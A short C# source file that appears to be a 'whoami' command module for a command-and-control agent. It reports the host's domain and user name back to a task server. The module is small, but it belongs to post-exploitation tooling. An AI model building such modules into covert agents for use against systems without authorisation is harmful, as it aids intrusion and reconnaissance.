using Workflow.Contracts;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "whoami";
        private IDataBroker messageManager { get; set; }
        private ICredentialProvider tokenManager { get; set; }
        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.tokenManager = context.TokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = $"{Environment.UserDomainName}\\{Environment.UserName}",
                completed = true
            });
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
